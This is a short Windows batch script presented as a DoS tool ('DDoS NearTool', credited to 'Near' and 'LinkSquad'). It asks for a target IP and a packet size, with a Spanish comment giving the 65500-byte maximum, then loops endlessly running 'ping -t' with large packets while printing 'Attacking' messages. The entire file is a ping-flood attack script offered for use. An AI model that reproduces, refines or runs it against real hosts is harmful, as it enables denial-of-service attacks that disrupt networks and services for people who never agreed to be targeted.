@echo off
title DDoS NearTool
color 1F



echo =====================================================
echo          Near's Tool - DoS Batch - LinkSquad
echo =====================================================
set /p targetip=IP : 
echo =====================================================
echo (el maximo de bits son 65500)
set /p data=BYTES : 
echo =====================================================
goto loop
:loop
echo Attacking %targetip% with %data% Bytes of Data
ping -t %targetip% -l %data%
goto loop
